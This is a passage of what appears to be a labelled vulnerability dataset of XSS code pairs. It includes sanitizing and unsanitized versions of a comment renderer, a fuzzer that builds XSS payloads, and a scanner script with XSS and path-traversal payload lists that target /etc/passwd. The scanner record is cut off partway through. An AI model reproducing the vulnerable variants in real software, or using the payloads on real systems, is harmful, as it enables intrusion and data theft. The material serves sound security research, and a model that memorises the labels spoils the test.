as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n/n/n/n", "label": 1, "vtype": "xss"}, {"id": "bc18f1148918f6cef38f2d7f575482dc43575b7b", "code": "saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "bc18f1148918f6cef38f2d7f575482dc43575b7b", "code": "/saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        payload = \"<img src='%s'></img>\" % self.url\n        return payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 1, "vtype": "xss"}, {"id": "fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d", "code": "models/comment.py/n/nimport asyncio\n\nimport mistune\nimport markupsafe\nfrom tortoise import fields\nfrom tortoise.query_utils import Q\nfrom arq import create_pool\n\nfrom config import REDIS_URL\nfrom .base import BaseModel\nfrom .mc import cache, clear_mc\nfrom .user import GithubUser\nfrom .consts import K_COMMENT, ONE_HOUR\nfrom .react import ReactMixin, ReactItem\nfrom .signals import comment_reacted\nfrom .utils import RedisSettings\n\nmarkdown = mistune.Markdown()\nMC_KEY_COMMENT_LIST = 'comment:%s:comment_list'\nMC_KEY_N_COMMENTS = 'comment:%s:n_comments'\nMC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'\n\n\nclass Comment(ReactMixin, BaseModel):\n    github_id = fields.IntField()\n    post_id = fields.IntField()\n    ref_id = fields.IntField(default=0)\n    kind = K_COMMENT\n\n    class Meta:\n        table = 'comments'\n\n    async def set_content(self, content):\n        return await self.set_props_by_key('content', content)\n\n    async def save(self, *args, **kwargs):\n        content = kwargs.pop('content', None)\n        if content is not None:\n            await self.set_content(content)\n        return await super().save(*args, **kwargs)\n\n    @property\n    async def content(self):\n        rv = await self.get_props_by_key('content')\n        if rv:\n            return rv.decode('utf-8')\n\n    @property\n    async def html_content(self):\n        content = markupsafe.escape(await self.content)\n        if not content:\n            return ''\n        return markdown(content)\n\n    async def clear_mc(self):\n        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):\n            await clear_mc(key % self.post_id)\n\n    @property\n    async def user(self):\n        return await GithubUser.get(gid=self.github_id)\n\n    @property\n    async def n_likes(self):\n        return (await self.stats).love_count\n\n\nclass CommentMixin:\n    async def add_comment(self, user_id, content, ref_id=0):\n        obj = await Comment.create(github_id=user_id, post_id=self.id,\n                                   ref_id=ref_id)\n        redis = await create_pool(RedisSettings.from_url(REDIS_URL))\n        await asyncio.gather(\n            obj.set_content(content),\n            redis.enqueue_job('mention_users', self.id, content, user_id),\n            return_exceptions=True\n        )\n        return obj\n\n    async def del_comment(self, user_id, comment_id):\n        c = await Comment.get(id=comment_id)\n        if c and c.github_id == user_id and c.post_id == self.id:\n            await c.delete()\n            return True\n        return False\n\n    @property\n    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))\n    async def comments(self):\n        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])\n\n    @property\n    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))\n    async def n_comments(self):\n        return await Comment.filter(post_id=self.id).count()\n\n    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n        '{user_id}', '{self.id}'), ONE_HOUR)\n    async def comment_ids_liked_by(self, user_id):\n        cids = [c.id for c in await self.comments]\n        if not cids:\n            return []\n        queryset = await ReactItem.filter(\n            Q(user_id=user_id), Q(target_id__in=cids),\n            Q(target_kind=K_COMMENT))\n        return [item.target_id for item in queryset]\n\n\n@comment_reacted.connect\nasync def update_comment_list_cache(_, user_id, comment_id):\n    comment = await Comment.cache(comment_id)\n    if comment:\n        asyncio.gather(\n            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),\n            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n                user_id, comment.post_id)),\n            return_exceptions=True\n        )\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d", "code": "/models/comment.py/n/nimport asyncio\n\nimport mistune\nfrom tortoise import fields\nfrom tortoise.query_utils import Q\nfrom arq import create_pool\n\nfrom config import REDIS_URL\nfrom .base import BaseModel\nfrom .mc import cache, clear_mc\nfrom .user import GithubUser\nfrom .consts import K_COMMENT, ONE_HOUR\nfrom .react import ReactMixin, ReactItem\nfrom .signals import comment_reacted\nfrom .utils import RedisSettings\n\nmarkdown = mistune.Markdown()\nMC_KEY_COMMENT_LIST = 'comment:%s:comment_list'\nMC_KEY_N_COMMENTS = 'comment:%s:n_comments'\nMC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'\n\n\nclass Comment(ReactMixin, BaseModel):\n    github_id = fields.IntField()\n    post_id = fields.IntField()\n    ref_id = fields.IntField(default=0)\n    kind = K_COMMENT\n\n    class Meta:\n        table = 'comments'\n\n    async def set_content(self, content):\n        return await self.set_props_by_key('content', content)\n\n    async def save(self, *args, **kwargs):\n        content = kwargs.pop('content', None)\n        if content is not None:\n            await self.set_content(content)\n        return await super().save(*args, **kwargs)\n\n    @property\n    async def content(self):\n        rv = await self.get_props_by_key('content')\n        if rv:\n            return rv.decode('utf-8')\n\n    @property\n    async def html_content(self):\n        content = await self.content\n        if not content:\n            return ''\n        return markdown(content)\n\n    async def clear_mc(self):\n        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):\n            await clear_mc(key % self.post_id)\n\n    @property\n    async def user(self):\n        return await GithubUser.get(gid=self.github_id)\n\n    @property\n    async def n_likes(self):\n        return (await self.stats).love_count\n\n\nclass CommentMixin:\n    async def add_comment(self, user_id, content, ref_id=0):\n        obj = await Comment.create(github_id=user_id, post_id=self.id,\n                                   ref_id=ref_id)\n        redis = await create_pool(RedisSettings.from_url(REDIS_URL))\n        await asyncio.gather(\n            obj.set_content(content),\n            redis.enqueue_job('mention_users', self.id, content, user_id),\n            return_exceptions=True\n        )\n        return obj\n\n    async def del_comment(self, user_id, comment_id):\n        c = await Comment.get(id=comment_id)\n        if c and c.github_id == user_id and c.post_id == self.id:\n            await c.delete()\n            return True\n        return False\n\n    @property\n    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))\n    async def comments(self):\n        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])\n\n    @property\n    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))\n    async def n_comments(self):\n        return await Comment.filter(post_id=self.id).count()\n\n    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n        '{user_id}', '{self.id}'), ONE_HOUR)\n    async def comment_ids_liked_by(self, user_id):\n        cids = [c.id for c in await self.comments]\n        if not cids:\n            return []\n        queryset = await ReactItem.filter(\n            Q(user_id=user_id), Q(target_id__in=cids),\n            Q(target_kind=K_COMMENT))\n        return [item.target_id for item in queryset]\n\n\n@comment_reacted.connect\nasync def update_comment_list_cache(_, user_id, comment_id):\n    comment = await Comment.cache(comment_id)\n    if comment:\n        asyncio.gather(\n            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),\n            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n                user_id, comment.post_id)),\n            return_exceptions=True\n        )\n/n/n/n", "label": 1, "vtype": "xss"}, {"id": "ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e", "code": "readthedocs/search/tests/test_xss.py/n/nimport pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n\n        hits = results.hits.hits\n        assert len(hits) == 1  # there should be only one result\n\n        inner_hits = hits[0]['inner_hits']\n\n        domain_hits = inner_hits['domains']['hits']['hits']\n        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n\n        section_hits = inner_hits['sections']['hits']['hits']\n        assert len(section_hits) == 1\n\n        section_content_highlight = section_hits[0]['highlight']['sections.content']\n        assert len(section_content_highlight) == 1\n\n        assert expected in section_content_highlight[0]\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e", "code": "/readthedocs/search/tests/test_xss.py/n/nimport pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n\n        hits = results.hits.hits\n        assert len(hits) == 1  # there should be only one result\n\n        inner_hits = hits[0]['inner_hits']\n\n        domain_hits = inner_hits['domains']['hits']['hits']\n        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n\n        section_hits = inner_hits['sections']['hits']['hits']\n        assert len(section_hits) == 1\n\n        section_content_highlight = section_hits[0]['highlight']['sections.content']\n        assert len(section_content_highlight) == 1\n\n        assert expected in section_content_highlight[0]\n/n/n/n", "label": 1, "vtype": "xss"}, {"id": "73d12b579a488013c561179bb95b1d45c2b48e2f", "code": "scripts/beaxssf.py/n/n#! python\n###############################################\n#   BEstAutomaticXSSFinder                    #\n#   Author: malwrforensics                    #\n#   Contact: malwr at malwrforensics dot com  #\n###############################################\n\nimport sys\nimport os\nimport requests\nimport re\n\nDEBUG = 0\nxss_attacks = [ \"<script>alert(1);</script>\", \"<script>prompt(1)</script>\",\n                \"<img src=x onerror=prompt(/test/)>\",\n                \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                \"<img src=test123456.jpg onerror=alert(1)>\"]\n\nlfi_attacks = [\n                #linux\n                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',\n                '../../../../../etc/passwd', '../../../../../../etc/passwd',\n                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',\n                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',\n                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n\n                #windows\n                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',\n                '../../../../../boot.ini', '../../../../../../boot.ini',\n                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',\n                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',\n                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',\n                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',\n                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'\n                ]\n\nlfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']\n\ndef check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global xss_attacks\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] XSS check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for xss in xss_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = xss\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        if r.content.find(xss)>=0:\n            print \"[+] Target is VULNERABLE\"\n            print \"Url: \" + url\n            print \"Parameters: %s\\n\" % str(post_params)\n\n            #comment out the return if you want all the findings\n            return\n    return\n\ndef check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global lfi_attacks\n    global lfi_expect\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] LFI check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for lfi in lfi_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = lfi\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = 